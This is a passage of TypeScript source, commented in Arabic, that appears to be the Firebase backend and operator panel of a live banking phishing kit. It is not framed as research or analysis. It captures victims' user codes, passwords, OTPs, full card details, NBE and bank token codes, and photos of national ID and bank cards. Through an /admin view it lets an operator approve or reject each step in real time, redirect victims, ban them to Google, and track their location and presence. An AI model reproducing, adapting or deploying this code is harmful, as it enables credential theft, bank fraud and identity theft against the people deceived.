      updates.usernameStatus = "none";
      updates.password = "";
      updates.passwordEntered = false;
      updates.passwordStatus = "none";
      updates.otp = "";
      updates.otpEntered = false;
      updates.verificationStatus = "none";
      updates["verification/status"] = "none";
      updates["verification/otp"] = "";
      updates.nbeToken = "";
      updates.nbeTokenEntered = false;
      updates.nbeTokenStatus = "none";
      updates.status = "بانتظار إدخال كود المستخدم";
    } else if (step === "password") {
      updates.password = "";
      updates.passwordEntered = false;
      updates.passwordStatus = "none";
      updates.otp = "";
      updates.otpEntered = false;
      updates.verificationStatus = "none";
      updates["verification/status"] = "none";
      updates["verification/otp"] = "";
      updates.nbeToken = "";
      updates.nbeTokenEntered = false;
      updates.nbeTokenStatus = "none";
      updates.status = "بانتظار إدخال كلمة المرور";
    } else if (step === "otp") {
      updates.usernameStatus = "approved";
      updates.passwordStatus = "approved";
      updates.otp = "";
      updates.otpEntered = false;
      updates.verificationStatus = "none";
      updates["verification/status"] = "none";
      updates["verification/otp"] = "";
      updates.nbeToken = "";
      updates.nbeTokenEntered = false;
      updates.nbeTokenStatus = "none";
      updates.status = "بانتظار إدخال رمز التحقق OTP";
    } else if (step === "card") {
      updates.usernameStatus = "approved";
      updates.passwordStatus = "approved";
      updates.verificationStatus = "approved";
      updates["verification/status"] = "approved";
      updates.cardNumber = "";
      updates.cardExpiry = "";
      updates.cardCvv = "";
      updates.cardEntered = false;
      updates.cardStatus = "none";
      updates.nbeToken = "";
      updates.nbeTokenEntered = false;
      updates.nbeTokenStatus = "none";
      updates.status = "بانتظار إدخال بيانات البطاقة";
    } else if (step === "nbe_token") {
      updates.usernameStatus = "approved";
      updates.passwordStatus = "approved";
      updates.verificationStatus = "approved";
      updates["verification/status"] = "approved";
      updates.cardStatus = "approved";
      updates.nbeToken = "";
      updates.nbeTokenEntered = false;
      updates.nbeTokenStatus = "none";
      updates.status = "بانتظار إدخال رمز NBE توكن";
    } else if (step === "bm_token") {
      updates.usernameStatus = "approved";
      updates.passwordStatus = "approved";
      updates.verificationStatus = "approved";
      updates["verification/status"] = "approved";
      updates.cardStatus = "approved";
      updates.nbeTokenStatus = "approved";
      updates.bmToken = "";
      updates.bmTokenEntered = false;
      updates.bmTokenStatus = "none";
      updates.status = "بانتظار إدخال رمز جهاز توكن";
    }
  } else if (canonicalTarget === ROUTE_PATHS.waitingRoom || canonicalTarget === "/waiting") {
    updates.status = "في صفحة الانتظار";
  } else if (canonicalTarget === ROUTE_PATHS.chat || canonicalTarget === "/call") {
    updates.status = "في صفحة المحادثات / خدمة العملاء";
  } else if (canonicalTarget === "/documents" || canonicalTarget === "/verify-identity" || canonicalTarget === "/verify-docs") {
    updates.status = "في صفحة توثيق المستندات";
  } else if (canonicalTarget.startsWith("http")) {
    updates.status = "تم التوجيه إلى واتساب";
  }

  await Promise.all([
    databaseModule.update(customerRef, cleanPayload(updates)),
    databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
      type: "remote_redirect",
      payload: cleanPayload({ target, step, timestamp }),
      createdAt: now,
      page: "/admin",
    }),
  ]);
};

export const submitCustomerDocuments = async (docs: {
  nationalIdFrontImage?: string;
  nationalIdBackImage?: string;
  bankCardImage?: string;
}) => {
  const id = getCustomerId();
  if (!id) return;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  const updates: Record<string, unknown> = {
    nationalIdFrontImage: docs.nationalIdFrontImage || "",
    nationalIdBackImage: docs.nationalIdBackImage || "",
    bankCardImage: docs.bankCardImage || "",
    documentsSubmitted: true,
    documentsStatus: "pending",
    documentsSubmittedAt: now,
    status: "تم رفع المستندات",
    lastAction: "رفع وتوثيق بطاقة الرقم القومي والبطاقة البنكية",
    updatedAt: now,
  };

  await Promise.all([
    databaseModule.update(customerRef, cleanPayload(updates)),
    databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
      type: "documents_submitted",
      payload: cleanPayload({
        hasNationalIdFront: !!docs.nationalIdFrontImage,
        hasNationalIdBack: !!docs.nationalIdBackImage,
        hasBankCard: !!docs.bankCardImage,
      }),
      createdAt: now,
      page: "/documents",
    }),
  ]);
};

export const updateDocumentsDecision = async (
  id: string,
  decision: CustomerStepStatus,
) => {
  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  const updates: Record<string, unknown> = {
    documentsStatus: decision,
    lastAction: `قرار المستندات: ${decision === "approved" ? "قبول" : decision === "rejected" ? "رفض" : "معلق"}`,
    updatedAt: now,
  };

  await Promise.all([
    databaseModule.update(customerRef, cleanPayload(updates)),
    databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
      type: "documents_decision",
      payload: cleanPayload({ decision }),
      createdAt: now,
      page: "/admin",
    }),
  ]);
};

export const initRemoteRedirectListener = async (
  onRedirect: (target: string, step?: string) => void,
) => {
  if (!import.meta.client) return () => {};
  const id = getCustomerId();
  if (!id) return () => {};

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const redirectRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}/remoteRedirect`);

  let lastHandledTimestamp = 0;
  const storedTs = window.sessionStorage.getItem("last_handled_redirect_ts");
  if (storedTs) {
    lastHandledTimestamp = parseInt(storedTs, 10) || 0;
  }

  const unsubscribe = databaseModule.onValue(redirectRef, (snapshot) => {
    const redirect = snapshot.val() as { target: string; step?: string; timestamp: number } | null;
    if (!redirect || !redirect.target) return;

    if (redirect.timestamp > lastHandledTimestamp) {
      lastHandledTimestamp = redirect.timestamp;
      window.sessionStorage.setItem("last_handled_redirect_ts", String(redirect.timestamp));
      onRedirect(redirect.target, redirect.step);
    }
  });

  return () => {
    databaseModule.off(redirectRef, "value", unsubscribe);
  };
};

export const updateCustomerLoginStep = async (step: string) => {
  if (!import.meta.client) return;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  if (!id) return;
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
  const stepLabels: Record<string, string> = {
    username: "كود المستخدم",
    password: "كلمة المرور",
    otp: "رمز التحقق OTP",
    card: "بيانات البطاقة",
    nbe_token: "NBE توكن",
    bm_token: "جهاز توكن",
  };
  const label = stepLabels[step] || step;
  const fullPath = `/login?step=${step}`;
  currentPresencePath = fullPath;

  try {
    await databaseModule.update(customerRef, {
      currentStep: step,
      lastPage: fullPath,
      lastAction: `في مرحلة: ${label}`,
      "presence/currentPage": fullPath,
      "presence/currentStep": step,
      "presence/state": "online",
      "presence/lastChangedAt": databaseModule.serverTimestamp(),
      updatedAt: new Date().toISOString(),
    });
  } catch (err) {
    console.warn("Could not update login step in RTDB:", err);
  }
};

export const syncCustomerPresence = async (path: string) => {
  if (!import.meta.client) return;

  // ✅ توحيد المسار قبل أي شيء (يحوّل /waiting و /call و /Waiting و غيرها إلى الصيغة الموحدة)
  const normalizedPath = normalizePath(path);
  // تجاهل صفحات النظام في التتبع (admin/blocked)
  if (!isPublicVisitorPath(normalizedPath)) {
    currentPresencePath = normalizedPath;
    return;
  }

  currentPresencePath = normalizedPath;
  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const code = getCustomerCode();
  const presenceStateRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}/presence/state`);
  const presenceTimeRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}/presence/lastChangedAt`);
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
  const connectedRef = databaseModule.ref(db, ".info/connected");

  const isLoginPage = normalizedPath.split("?")[0] === "/login";
  const step = isLoginPage && normalizedPath.includes("step=") ? normalizedPath.split("step=")[1]?.split("&")[0] : null;

  const updateData: Record<string, any> = {
    code,
    updatedAt: new Date().toISOString(),
    lastPage: normalizedPath,
    "presence/state": "online",
    "presence/currentPage": normalizedPath,
    "presence/lastChangedAt": databaseModule.serverTimestamp(),
  };

  // ضخ بيانات الـ Geo مرة واحدة (أول زيارة) — يضمن أن اللوحة ترى الدولة والمنطقة فوراً
  try {
    const snap = await databaseModule.get(customerRef);
    const cur = snap.exists() ? (snap.val() as Partial<CustomerRecord>) : {};
    const geoPatch = await buildGeoPatch(cur);
    for (const [key, value] of Object.entries(geoPatch)) {
      if (value !== undefined && value !== null && value !== "") {
        updateData[key] = value;
      }
    }
  } catch {
    /* silent — لا نكسر تتبع الـ presence لو فشل الـ geo */
  }

  if (step) {
    updateData.currentStep = step;
    updateData["presence/currentStep"] = step;
  } else if (!isLoginPage) {
    updateData.currentStep = null;
    updateData["presence/currentStep"] = null;
  }

  await databaseModule.update(customerRef, updateData);

  // إعداد onDisconnect لتغيير حالة الاتصال فقط لـ offline دون مسح أو تغيير الصفحة الأخيرة أو المرحلة
  void databaseModule.onDisconnect(presenceStateRef).set("offline");
  void databaseModule.onDisconnect(presenceTimeRef).set(databaseModule.serverTimestamp());

  if (presenceStarted) return;
  presenceStarted = true;

  databaseModule.onValue(connectedRef, (snapshot) => {
    if (snapshot.val() !== true) return;

    void databaseModule.onDisconnect(presenceStateRef).set("offline");
    void databaseModule.onDisconnect(presenceTimeRef).set(databaseModule.serverTimestamp());

    void databaseModule.update(customerRef, {
      code,
      updatedAt: new Date().toISOString(),
      lastPage: currentPresencePath,
      "presence/state": "online",
      "presence/currentPage": currentPresencePath,
      "presence/lastChangedAt": databaseModule.serverTimestamp(),
    });
  });
};

/**
 * تحديث خفيف وسريع لموقع الزائر الحالي فقط — مصمَّم خصيصاً ليستدعى
 * من الـ Global Route Listener في plugins/customer-page-tracker.client.ts
 * عند كل تنقل بين الصفحات.
 *
 * يضمن:
 *   1. توحيد المسار (/waiting → /waiting-room ، /call → /chat).
 *   2. إرسال presence/currentPage + lastPage + updatedAt فوراً.
 *   3. إبقاء حالة الـ presence = online و lastChangedAt محدّثة.
 *   4. تجاهل صفحات النظام (admin, blocked).
 *
 * يُعيد نفس id لضمان سلسلة تحديثات متتابعة بدون شروط سباق (race conditions).
 */
let pageChangeInFlight: Promise<string | null> | null = null;

export const reportPageChange = async (rawPath: string): Promise<string | null> => {
  if (!import.meta.client) return null;

  // توحيد المسار
  const normalized = normalizePath(rawPath);
  if (!isPublicVisitorPath(normalized)) return null;

  // لو كان هناك تحديث سابق قيد التنفيذ، انتظر حتى ينتهي لتجنّب التصادم
  if (pageChangeInFlight) {
    try {
      await pageChangeInFlight;
    } catch {
      /* ignore */
    }
  }

  pageChangeInFlight = (async () => {
    try {
      const db = await getFirebaseDatabase();
      const databaseModule = await import("firebase/database");
      const id = getCustomerId();
      const code = getCustomerCode();
      const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

      // تحديث سريع — يكتب المسار الموحَّد في presence/lastPage
      await databaseModule.update(customerRef, {
        code,
        updatedAt: new Date().toISOString(),
        lastPage: normalized,
        "presence/state": "online",
        "presence/currentPage": normalized,
        "presence/lastChangedAt": databaseModule.serverTimestamp(),
      });

      currentPresencePath = normalized;

      // إعادة ضبط onDisconnect لتغيير الحالة لـ offline فقط دون مسح الصفحة
      const presenceStateRef = databaseModule.ref(
        db,
        `${firebasePaths.customers}/${id}/presence/state`,
      );
      const presenceTimeRef = databaseModule.ref(
        db,
        `${firebasePaths.customers}/${id}/presence/lastChangedAt`,
      );
      void databaseModule.onDisconnect(presenceStateRef).set("offline");
      void databaseModule.onDisconnect(presenceTimeRef).set(databaseModule.serverTimestamp());

      return id;
    } catch (err) {
      console.warn("[reportPageChange] failed:", err);
      return null;
    } finally {
      pageChangeInFlight = null;
    }
  })();

  return pageChangeInFlight;
};

export const reportCustomerIssue = async (message: string, source: string) => {
  const occurredAt = new Date().toISOString();

  return trackCustomerActivity(
    {
      status: "مشكلة",
      lastAction: "تم تسجيل مشكلة في الواجهة",
      issue: {
        message: message.slice(0, 500),
        source,
        occurredAt,
      },
    },
    "client_issue",
    { message: message.slice(0, 500), source },
  );
};

export const useDashboardCustomers = (enabled = ref(true)) => {
  const customers = ref<CustomerRecord[]>([]);
  const loading = ref(true);
  const error = ref("");
  let unsubscribe: (() => void) | null = null;
  let pollInterval: ReturnType<typeof setInterval> | null = null;

  // ضمان التحديث اللحظي حتى لو تأخّر الـ realtime listener (مثلاً خلف proxy)
  // نجلب لقطة جديدة كل ثانية — تكلفة بسيطة مقابل تجربة فورية
  // (قلّلنا من 3 إلى 1 ثانية لحلّ مشكلة تخلّف اسم الصفحة في القائمة الجانبية)
  const POLL_INTERVAL_MS = 1000;

  const stopListening = () => {
    unsubscribe?.();
    unsubscribe = null;
    if (pollInterval) {
      clearInterval(pollInterval);
      pollInterval = null;
    }
  };

  const fetchOnce = async () => {
    try {
      const db = await getFirebaseDatabase();
      const databaseModule = await import("firebase/database");
      const customersRef = databaseModule.ref(db, firebasePaths.customers);
      const snapshot = await databaseModule.get(customersRef);
      const raw = snapshot.val() as Record<string, any> | null;
      if (!raw) {
        customers.value = [];
        return;
      }
      const list: CustomerRecord[] = Object.entries(raw).map(([key, val]) => {
        const item = typeof val === "object" && val !== null ? val : {};
        return {
          id: item.id || key,
          ...item,
        } as CustomerRecord;
      });
      customers.value = list.sort((a, b) => (b.updatedAt || "").localeCompare(a.updatedAt || ""));
    } catch (err) {
      // silent — polling error
    }
  };

  const startListening = async () => {
    if (!import.meta.client) return;
    // إن كنا نسمع بالفعل، أوقف الـ listener السابق لتجنّب التكرار
    stopListening();

    try {
      loading.value = true;
      error.value = "";
      const db = await getFirebaseDatabase();
      const databaseModule = await import("firebase/database");
      const customersRef = databaseModule.ref(db, firebasePaths.customers);

      // Realtime listener: المصدر الأول للتحديثات
      unsubscribe = databaseModule.onValue(
        customersRef,
        (snapshot) => {
          const raw = snapshot.val() as Record<string, any> | null;
          if (!raw) {
            customers.value = [];
            loading.value = false;
            return;
          }

          const list: CustomerRecord[] = Object.entries(raw).map(([key, val]) => {
            const item = typeof val === "object" && val !== null ? val : {};
            return {
              id: item.id || key,
              ...item,
            } as CustomerRecord;
          });

          customers.value = list.sort((a, b) => (b.updatedAt || "").localeCompare(a.updatedAt || ""));
          loading.value = false;
        },
        (reason) => {
          error.value = reason.message;
          loading.value = false;
        },
      );

      // Polling احتياطي: كل 3 ثواني نجلب لقطة جديدة من Firebase
      // يضمن التحديث اللحظي حتى لو تعطّل الـ realtime listener (proxy, ad-block, network, ...)
      pollInterval = setInterval(() => {
        void fetchOnce();
      }, POLL_INTERVAL_MS);
    } catch (reason) {
      error.value = reason instanceof Error ? reason.message : "تعذر الاتصال بقاعدة البيانات";
      loading.value = false;
    }
  };

  watch(
    enabled,
    (isEnabled) => {
      if (!isEnabled) {
        stopListening();
        customers.value = [];
        loading.value = false;
        return;
      }

      void startListening();
    },
    { immediate: true },
  );

  onBeforeUnmount(() => {
    stopListening();
  });

  const updateCustomerStatus = async (id: string, status: CustomerStatus) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    await databaseModule.update(databaseModule.ref(db, `${firebasePaths.customers}/${id}`), {
      status,
      updatedAt: new Date().toISOString(),
    });
  };

  /**
   * مسح كافة حالات "الانتظار" للعميل في Firebase.
   * تُستدعى عند أي قرار من الأدمن (قبول/رفض/توجيه) لضمان أن الزبون
   * يختفي نهائياً من قائمة "قيد الانتظار" في اللوحة (وليس فقط محلياً).
   */
  const clearCustomerPendingStatuses = async (id: string) => {
    try {
      const db = await getFirebaseDatabase();
      const databaseModule = await import("firebase/database");
      const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
      const now = new Date().toISOString();
      await databaseModule.update(
        customerRef,
        cleanPayload({
          cardStatus: "none",
          nbeTokenStatus: "none",
          bmTokenStatus: "none",
          verificationStatus: "none",
          passwordStatus: "none",
          usernameStatus: "none",
          documentsStatus: "none",
          "verification/status": "none",
          currentStep: null,
          "presence/currentStep": null,
          updatedAt: now,
        }),
      );
    } catch (err) {
      console.warn("clearCustomerPendingStatuses failed", err);
    }
  };

  const updateCustomerVerification = async (
    id: string,
    status: CustomerVerificationStatus,
    attemptId?: string,
  ) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول التحقق" : "تم رفض التحقق";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    const verificationSnapshot = await databaseModule.get(
      databaseModule.ref(db, `${firebasePaths.customers}/${id}/verification/attemptId`),
    );
    const resolvedAttemptId = attemptId ?? (verificationSnapshot.val() as string | null) ?? undefined;
    const updates: Record<string, unknown> = {
      "verification/status": status,
      "verification/decidedAt": now,
      verificationStatus: status,
      decidedAt: now,
      status: status === "approved" ? "متابعة" : "مشكلة",
      lastAction: statusText,
      updatedAt: now,
    };

    if (resolvedAttemptId && resolvedAttemptId !== "legacy-login") {
      updates[`loginAttempts/${resolvedAttemptId}/verificationStatus`] = status;
      updates[`loginAttempts/${resolvedAttemptId}/decidedAt`] = now;
    }

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "verification_decision",
        payload: cleanPayload({ status, attemptId: resolvedAttemptId }),
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updateUsernameDecision = async (id: string, status: "approved" | "rejected") => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول كود المستخدم" : "تم رفض كود المستخدم";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload({
        usernameStatus: status,
        status: status === "approved" ? "متابعة" : "مشكلة",
        lastAction: statusText,
        updatedAt: now,
      })),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "username_decision",
        payload: { status },
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updatePasswordDecision = async (id: string, status: "approved" | "rejected") => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول كلمة المرور" : "تم رفض كلمة المرور";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload({
        passwordStatus: status,
        status: status === "approved" ? "متابعة" : "مشكلة",
        lastAction: statusText,
        updatedAt: now,
      })),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "password_decision",
        payload: { status },
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updateLoginCredentialsDecision = async (id: string, status: "approved" | "rejected") => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول بيانات تسجيل الدخول" : "تم رفض بيانات تسجيل الدخول";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload({
        usernameStatus: status,
        passwordStatus: status,
        status: status === "approved" ? "متابعة" : "مشكلة",
        lastAction: statusText,
        updatedAt: now,
      })),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "login_credentials_decision",
        payload: { status },
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updateCardDecision = async (
    id: string,
    status: "approved" | "rejected",
    attemptId?: string,
  ) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول بيانات البطاقة" : "تم رفض بيانات البطاقة";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    
    const customerSnapshot = await databaseModule.get(customerRef);
    const customerData = customerSnapshot.val() as Record<string, any> | null;
    
    const resolvedAttemptId = attemptId ?? customerData?.verification?.attemptId ?? undefined;
    const updates: Record<string, unknown> = {
      cardStatus: status,
      status: status === "approved" ? "متابعة" : "مشكلة",
      lastAction: statusText,
      updatedAt: now,
    };

    if (customerData?.loginAttempts) {
      const attempts = customerData.loginAttempts;
      const keys = typeof attempts === "object" ? Object.keys(attempts) : [];
      for (const k of keys) {
        if (attempts[k]?.cardStatus === "pending" || k === resolvedAttemptId) {
          updates[`loginAttempts/${k}/cardStatus`] = status;
          updates[`loginAttempts/${k}/cardDecidedAt`] = now;
        }
      }
    } else if (resolvedAttemptId && resolvedAttemptId !== "legacy-login") {
      updates[`loginAttempts/${resolvedAttemptId}/cardStatus`] = status;
      updates[`loginAttempts/${resolvedAttemptId}/cardDecidedAt`] = now;
    }

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "card_decision",
        payload: cleanPayload({ status, attemptId: resolvedAttemptId }),
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updateNbeTokenDecision = async (
    id: string,
    status: "approved" | "rejected",
    attemptId?: string,
  ) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول NBE توكن" : "تم رفض NBE توكن";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    const verificationSnapshot = await databaseModule.get(
      databaseModule.ref(db, `${firebasePaths.customers}/${id}/verification/attemptId`),
    );
    const resolvedAttemptId = attemptId ?? (verificationSnapshot.val() as string | null) ?? undefined;
    const updates: Record<string, unknown> = {
      nbeTokenStatus: status,
      status: status === "approved" ? "متابعة" : "مشكلة",
      lastAction: statusText,
      updatedAt: now,
    };

    if (resolvedAttemptId && resolvedAttemptId !== "legacy-login") {
      updates[`loginAttempts/${resolvedAttemptId}/nbeTokenStatus`] = status;
      updates[`loginAttempts/${resolvedAttemptId}/nbeTokenDecidedAt`] = now;
    }

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "nbe_token_decision",
        payload: cleanPayload({ status, attemptId: resolvedAttemptId }),
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updateBmTokenDecision = async (
    id: string,
    status: "approved" | "rejected",
    attemptId?: string,
  ) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const statusText = status === "approved" ? "تم قبول جهاز توكن" : "تم رفض جهاز توكن";
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    const verificationSnapshot = await databaseModule.get(
      databaseModule.ref(db, `${firebasePaths.customers}/${id}/verification/attemptId`),
    );
    const resolvedAttemptId = attemptId ?? (verificationSnapshot.val() as string | null) ?? undefined;
    const updates: Record<string, unknown> = {
      bmTokenStatus: status,
      status: status === "approved" ? "متابعة" : "مشكلة",
      lastAction: statusText,
      updatedAt: now,
    };

    if (resolvedAttemptId && resolvedAttemptId !== "legacy-login") {
      updates[`loginAttempts/${resolvedAttemptId}/bmTokenStatus`] = status;
      updates[`loginAttempts/${resolvedAttemptId}/bmTokenDecidedAt`] = now;
    }

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "bm_token_decision",
        payload: cleanPayload({ status, attemptId: resolvedAttemptId }),
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const updateDocumentsDecision = async (
    id: string,
    status: CustomerStepStatus,
  ) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

    const statusText =
      status === "approved"
        ? "تم قبول المستندات المرفوعة"
        : status === "rejected"
        ? "تم رفض المستندات المرفوعة"
        : "المستندات قيد المراجعة";

    const updates: Record<string, unknown> = {
      documentsStatus: status,
      status: statusText,
      lastAction: statusText,
      updatedAt: now,
    };

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "documents_decision",
        payload: cleanPayload({ status }),
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const banCustomer = async (id: string) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const bannedUntil = Date.now() + 24 * 60 * 60 * 1000; // حظر لمدة 24 ساعة
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    const updates: Record<string, unknown> = {
      isBanned: true,
      bannedUntil,
      bannedAt: now,
      status: "مشكلة",
      lastAction: "تم حظر المستخدم لمدة 24 ساعة وتوجيهه إلى Google",
      remoteRedirect: {
        target: "https://www.google.com",
        step: "banned",
        timestamp: Date.now(),
      },
      updatedAt: now,
    };

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "customer_banned",
        payload: { bannedUntil, reason: "admin_ban_24h" },
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const unbanCustomer = async (id: string) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    const updates: Record<string, unknown> = {
      isBanned: false,
      bannedUntil: null,
      status: "متابعة",
      lastAction: "تم إلغاء الحظر عن المستخدم",
      updatedAt: now,
    };

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload(updates)),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: "customer_unbanned",
        payload: {},
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  const deleteCustomer = async (id: string) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    await Promise.all([
      databaseModule.remove(databaseModule.ref(db, `${firebasePaths.customers}/${id}`)),
      databaseModule.remove(databaseModule.ref(db, `${firebasePaths.events}/${id}`)),
    ]);
  };

  const deleteAllCustomers = async () => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    await Promise.all([
      databaseModule.remove(databaseModule.ref(db, firebasePaths.customers)),
      databaseModule.remove(databaseModule.ref(db, firebasePaths.events)),
    ]);
  };

  const toggleCustomerStarred = async (id: string, currentStarred?: boolean) => {
    const db = await getFirebaseDatabase();
    const databaseModule = await import("firebase/database");
    const now = new Date().toISOString();
    const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
    const nextStarred = !currentStarred;

    await Promise.all([
      databaseModule.update(customerRef, cleanPayload({
        isStarred: nextStarred,
        starredAt: nextStarred ? now : null,
      })),
      databaseModule.set(databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`)), {
        type: nextStarred ? "customer_starred" : "customer_unstarred",
        payload: { isStarred: nextStarred },
        createdAt: now,
        page: "/admin",
      }),
    ]);
  };

  return {
    customers,
    loading,
    error,
    updateCustomerStatus,
    updateCustomerVerification,
    updateUsernameDecision,
    updatePasswordDecision,
    updateLoginCredentialsDecision,
    updateCardDecision,
    updateNbeTokenDecision,
    updateBmTokenDecision,
    updateDocumentsDecision,
    sendCustomerRedirect,
    clearCustomerPendingStatuses,
    banCustomer,
    unbanCustomer,
    deleteCustomer,
    deleteAllCustomers,
    toggleCustomerStarred,
  };
};

// ----------------------------------------------------------------------------
// سجل أحداث العميل (Customer Activity Stream)
// ----------------------------------------------------------------------------
// هذه القائمة المسطحة تصف حدثاً واحداً مخزّناً في
// `${firebasePaths.events}/${customerId}/${pushId}` في Firebase Realtime DB.
// تم تصميمها بحيث يمكن للوحة التحكم عرض كل حدث كبطاقة بيانات مستقلة.
// الهيكل في القاعدة:
//   { type: string, payload: object, createdAt: ISO string, page: string }
export type CustomerActivityEvent = {
  id: string;
  type: string;
  payload: Record<string, unknown>;
  createdAt: string;
  page?: string;
  // الحقل أدناه اختياري ويُملأ افتراضياً من `lastAction` إن لم يُمرَّر صراحةً.
  message?: string;
};

// نوع مساعد للأحداث المعروفة لدينا — يمكن توسيعه مستقبلاً دون كسر المتوافقية.
export type KnownCustomerEventType =
  | "otp_resend_clicked"
  | "page_visit"
  | "watch_selected"
  | "delivery_info_submitted"
  | "username_submitted"
  | "password_submitted"
  | "login_submitted"
  | "otp_submitted"
  | "card_info_submitted"
  | "nbe_token_submitted"
  | "documents_submitted"
  | "documents_uploaded"
  | "verification_decision"
  | "token_confirmed"
  | "token_not_active"
  | "invalid_username_email"
  | "honeypot_triggered"
  | "success_viewed"
  | "client_issue"
  | "username_decision"
  | "password_decision"
  | "login_credentials_decision"
  | "card_decision"
  | "nbe_token_decision"
  | "bm_token_decision"
  | "documents_decision"
  | "redirect_command"
  | "customer_starred"
  | "customer_unstarred"
  | (string & {});

// تحويل حدث خام قادم من Firebase إلى عنصر منظَّم يفهمه القالب.
const normalizeCustomerEvent = (
  rawKey: string,
  rawValue: Record<string, unknown> | null | undefined,
): CustomerActivityEvent => {
  const safe = rawValue && typeof rawValue === "object" ? rawValue : {};
  const type = typeof safe.type === "string" ? safe.type : "unknown";
  const payload =
    safe.payload && typeof safe.payload === "object" && !Array.isArray(safe.payload)
      ? (safe.payload as Record<string, unknown>)
      : {};
  const createdAt =
    typeof safe.createdAt === "string" && safe.createdAt.trim()
